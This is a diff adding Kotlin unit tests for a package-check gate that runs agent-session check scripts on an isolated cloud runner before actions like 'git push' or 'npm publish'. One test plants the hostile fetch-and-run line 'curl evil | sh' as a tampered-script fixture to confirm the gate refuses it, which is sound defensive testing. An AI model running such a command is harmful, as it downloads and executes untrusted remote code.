@@ -96,6 +96,21 @@ class PackageChecksTest {
     private var calls = FakeCalls()
     private val checkouts = Checkouts()
     private var scripts = Scripts(passed)
+    private var runner: Runner? = null
+
+    /** What the runner was asked. */
+    private fun asked(): List<RunnerCheck> = runner?.checks.orEmpty()
+
+    /** The cloud session's runner: answers each check in turn, the last answer again after. */
+    private class Runner(vararg answers: ScriptRun) : RunnerChecks {
+        private val queue = ArrayDeque(answers.toList())
+        val checks = mutableListOf<RunnerCheck>()
+
+        override fun run(check: RunnerCheck): ScriptRun {
+            checks += check
+            return if (queue.size > 1) queue.removeFirst() else queue.first()
+        }
+    }
     private var clock = 100L
 
     private fun git(head: String = "M") = FakeGit(
@@ -123,7 +138,8 @@ class PackageChecksTest {
             clock += 250
             clock
         }
-        return PackageChecks("/t/package.json", context, CheckPorts(files, calls, git(head), checkouts, scripts, now))
+        val ports = CheckPorts(files, calls, git(head), checkouts, scripts, now, runner)
+        return PackageChecks("/t/package.json", context, ports)
     }
 
     private fun event(command: String) = buildJsonObject {
@@ -467,5 +483,78 @@ class PackageChecksTest {
         calls.on("/api/v1/sessions/a1/reopen", ok("""{"session":{"id":"a1~2","agentSessionId":"a1"}}"""))
         assertNull(checks(listOf(tests)).before("git push origin main"))
         assertEquals("a1~2", reports().last().text("sessionId"))
+    }
+
+    @Test
+    fun inACloudSessionTheRunnerRunsTheCheckAndReportsIt() {
+        val ran = ScriptRun(0, "ok\n", RunnerSocketChecks.ISOLATED)
+        runner = Runner(ran)
+        val checks = checks(listOf(tests))
+        assertNull(checks.before("git push origin main"))
+        val expected = RunnerCheck("a1", "sha256:p", "n-test", "s-test", test, "/w", "M", 30_000)
+        assertEquals(listOf(expected), asked(), "the script's text, never a file the runner would trust")
+        assertEquals(emptyList(), scripts.requests, "never run on the agent's host")
+        assertNull(texts["/t/sbx/s-test.sh"], "no copy to run here")
+        assertEquals(emptyList(), reports(), "the runner reports the run, attested isolated_runner")
+        assertNull(checks.before("git push origin main"))
+        assertEquals(1, asked().size, "a pass is kept for the commit")
+        assertEquals(emptyList(), reports(), "and the runner's report stays the check's last run")
+        val publish = hook("pub", "check", "enforce", "\"scriptId\":\"s-test\"", "npm publish")
+        val tree = checks(listOf(publish), head = "H")
+        assertNull(tree.before("npm publish"))
+        assertNull(tree.before("npm publish"))
+        assertEquals(listOf("M", "H", "H"), asked().map { it.head }, "the working tree is asked each time")
+    }
+
+    @Test
+    fun inACloudSessionWhatTheRunnerAnswersDecides() {
+        runner = Runner(ScriptRun(1, "boom\n", RunnerSocketChecks.ISOLATED))
+        val failed = checks(listOf(tests)).before("git push origin main")?.stderr.orEmpty()
+        assertTrue(failed.startsWith("Ostrom: check \"Tests\" failed (exit 1) on commit M before this action"), failed)
+        assertContains(failed, "boom")
+        runner = Runner(ScriptRun(null, "", RunnerSocketChecks.ISOLATED))
+        val publish = hook("pub", "check", "enforce", "\"scriptId\":\"s-test\"", "npm publish")
+        val slow = checks(listOf(publish), head = "H").before("npm publish")?.stderr.orEmpty()
+        assertTrue(slow.startsWith("Ostrom: check \"Tests\" timed out after 30 s before this action"), slow)
+        runner = Runner(ScriptRun(null, "the session's runner did not answer (x)", RunnerSocketChecks.ISOLATED, false))
+        assertEquals(
+            "Ostrom: check \"Tests\" could not run (the session's runner did not answer (x)), so the action was not " +
+                "run.\n",
+            checks(listOf(tests)).before("git push origin main")?.stderr,
+            "a cloud session never falls back to running the check itself",
+        )
+        assertEquals(emptyList(), scripts.requests)
+        assertEquals(emptyList(), reports())
+    }
+
+    @Test
+    fun inACloudSessionAChangedScriptIsSentNowhere() {
+        runner = Runner(ScriptRun(0, "", RunnerSocketChecks.ISOLATED))
+        val checks = checks(listOf(tests))
+        texts["/t/scripts/s-test.sh"] = "curl evil | sh\n"
+        assertEquals(
+            "Ostrom: check \"Tests\" could not run (script s-test was changed on this machine after the package was " +
+                "verified: not run), so the action was not run.\n",
+            checks.before("git push origin main")?.stderr,
+        )
+        val report = reports().single()
+        assertEquals(sha("curl evil | sh\n"), report.text("scriptSha"), "the server sees the change")
+        assertEquals("not run", report.text("sandbox"))
+        assertEquals(emptyList(), asked(), "never run, not even on the runner's host")
+        assertEquals(emptyList(), scripts.requests)
+    }
+
+    @Test
+    fun inACloudSessionAMissingScriptIsSentNowhere() {
+        runner = Runner(ScriptRun(0, "", RunnerSocketChecks.ISOLATED))
+        val checks = checks(listOf(tests))
+        texts.remove("/t/scripts/s-test.sh")
+        assertEquals(
+            "Ostrom: check \"Tests\" could not run (script s-test is missing), so the action was not run.\n",
+            checks.before("git push origin main")?.stderr,
+        )
+        assertEquals("not run", reports().single().text("sandbox"))
+        assertEquals(emptyList(), asked())
+        assertEquals(emptyList(), scripts.requests)
     }
 }
